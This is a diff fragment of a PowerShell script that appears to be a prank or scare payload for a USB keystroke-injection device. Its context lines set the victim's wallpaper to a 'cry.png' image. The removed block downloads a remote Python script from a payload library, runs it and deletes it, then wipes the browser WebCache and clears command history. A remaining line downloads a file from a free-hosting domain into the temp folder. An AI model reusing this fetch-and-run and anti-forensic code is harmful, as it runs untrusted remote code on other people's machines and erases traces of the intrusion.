@@ -104,16 +104,6 @@ Add-Type -TypeDefinition $setwallpapersrc
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\cry.png" -Style Center
 
 
-$scriptUrl = "https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/payloads/library/execution/CloseAllApplicationsInWindows/script.py"
-$savePath = "$env:temp\script.py"
-(New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)
-
-& python $savePath
-
-Remove-Item $savePath
-Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*" -Recurse -Force
-Clear-History
-
 
 iwr https://leeward-log.000webhostapp.com/videoplayback.wav?dl=1 -O $env:TMP\e.wav
 
